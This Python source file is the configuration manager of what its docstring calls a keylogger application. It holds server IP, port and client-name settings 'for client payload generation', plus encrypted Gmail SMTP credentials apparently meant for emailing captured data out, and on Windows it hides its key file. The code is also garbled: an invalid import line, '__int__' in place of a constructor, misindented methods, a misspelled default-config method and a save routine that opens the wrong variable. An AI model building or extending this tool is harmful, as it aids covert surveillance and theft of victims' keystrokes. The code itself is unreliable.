"""
Configuration Manager for Keylogger Application
Handles saving and laoding configuration settings with encrypted passowrds
"""

import json
import os
import pathlib import path
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2
from cryptography.hazmat.backends import default_backend
import base64


class ConfigManager:


    def __int__(self, config_file="config.json", key_file=".config.key"):
        self.config_file = config_file
        self.key_file = key_file
        self.cipher = self._load_or_create_cipher()
        self.config = self.load_config()


    def _load_or_create_cipher(self):
        if os.path.exists(self.key_file):
            #Load Existing key
            with open(self.key_file, 'rb') as f:
                key = f.read()
            print(f"[+] Encryption key loaded from {self.key_file}")
        else:
            #generate new key
            key = Fernet.generate_key()
            with open(self.key_file, 'wb') as f:
                f.write(key)
            #hide they key file on windows
            if os.name == 'nt':
                try:
                    import ctypes
                    ctypes.windll.kernel32.SetFileAttributesW(self.key_file, 2) #Hidden
                except:
                    pass
                print(f"[+] New encryption key generated: {self.key_file}")

            return Fernet(key)


        def load_config(self):
            if os.path.exists(self.config_file):
                try:
                    with open(self.config_file, 'r') as f:
                        config = json.load(f)
                    print(f"[+] Configuration loaded from {self.config_file}")
                    return config
                except Exception as e:
                    print(f"[!] Error loading config: {e}")
                    return self._defualt_config()
            else:
                print(f"[*] No configuration file found, using defaults")
                return self._default_config()


        def save_config(self):
            try:
                with open(self.config, 'w') as f:
                    json.dump(self.config, f, indent=4)
                print(f"[+] Configuration saved to {self.config_file}")
                return True
            except Exception as e:
                print(f"[!] Error saving config: {e}")
                return False


        def _defualt_config(self):
            return {
                "server_settings": {
                    "server_ip": "127.0.0.1",
                    "server_port": 10000,
                    "client_name": "client1"
                },
                "email_info": {
                    "sender_email": "",
                    "app_password_encrypted": "",
                    "recipient_email": "",
                    "smtp_server": "smtp.gmail.com",
                    "smtp_port": 587
                },
                "version": "1.1"
            }

        def _encrypt_password(self, password):
            if not password:
                return ""
            try:
                encrypted = self.cipher.encrypt(password.encode())
                return encrypted.decode()
            except Exception as e:
                print(f"[!] Error encrypting password: {e}")
                return ""


        def _decrypt_password(self, encrypted_password):
        """Decrypt password using Fernet encryption"""
        if not encrypted_password:
            return ""
        try:
            decrypted = self.cipher.decrypt(encrypted_password.encode())
            return decrypted.decode()
        except Exception as e:
            print(f"[!] Error decrypting password: {e}")
            return ""

    # Server Settings Methods (for client payload generation)
    def set_server_settings(self, server_ip, server_port, client_name):
        """Set server settings for client payload generation"""
        self.config["server_settings"]["server_ip"] = server_ip
        self.config["server_settings"]["server_port"] = int(server_port)
        self.config["server_settings"]["client_name"] = client_name
        print(f"[+] Server settings saved for client generation")
        return self.save_config()

    def get_server_settings(self):
        """Get server settings"""
        return self.config["server_settings"].copy()

    # Email Info Methods
    def set_email_info(self, sender_email, app_password, recipient_email):
        """Set email information with encrypted app password"""
        self.config["email_info"]["sender_email"] = sender_email
        self.config["email_info"]["app_password_encrypted"] = self._encrypt_password(app_password)
        self.config["email_info"]["recipient_email"] = recipient_email
        print(f"[+] Email info encrypted and ready to save")
        return self.save_config()

    def get_email_info(self):
        """Get email information with decrypted app password"""
        info = {
            "sender_email": self.config["email_info"]["sender_email"],
            "app_password": "",
            "recipient_email": self.config["email_info"]["recipient_email"],
            "smtp_server": self.config["email_info"]["smtp_server"],
            "smtp_port": self.config["email_info"]["smtp_port"]
        }

        encrypted_pwd = self.config["email_info"].get("app_password_encrypted", "")
        if encrypted_pwd:
            info["app_password"] = self._decrypt_password(encrypted_pwd)

        return info

    def set_smtp_settings(self, smtp_server, smtp_port):
        """Set SMTP server settings"""
        self.config["email_info"]["smtp_server"] = smtp_server
        self.config["email_info"]["smtp_port"] = smtp_port
        return self.save_config()

    # Validation Methods
    def is_email_configured(self):
        """Check if email is configured"""
        email_info = self.config["email_info"]
        return bool(
            email_info["sender_email"] and
            email_info.get("app_password_encrypted", "") and
            email_info["recipient_email"]
        )

    def is_server_configured(self):
        """Check if server settings are configured"""
        server_info = self.config["server_settings"]
        return bool(server_info["server_ip"] and server_info["server_port"])

    # Utility Methods
    def get_config_file_path(self):
        """Get full path to config file"""
        return os.path.abspath(self.config_file)

    def get_key_file_path(self):
        """Get full path to key file"""
        return os.path.abspath(self.key_file)

    def export_config(self, export_path):
        """Export configuration (without decrypting passwords)"""
        try:
            import shutil
            shutil.copy(self.config_file, export_path)
            print(f"[+] Configuration exported to {export_path}")
            return True
        except Exception as e:
            print(f"[!] Error exporting config: {e}")
            return False


# Singleton instance
_config_manager = None

def get_config_manager():
    """Get or create ConfigManager singleton"""
    global _config_manager
    if _config_manager is None:
        _config_manager = ConfigManager()
    return _config_manager



















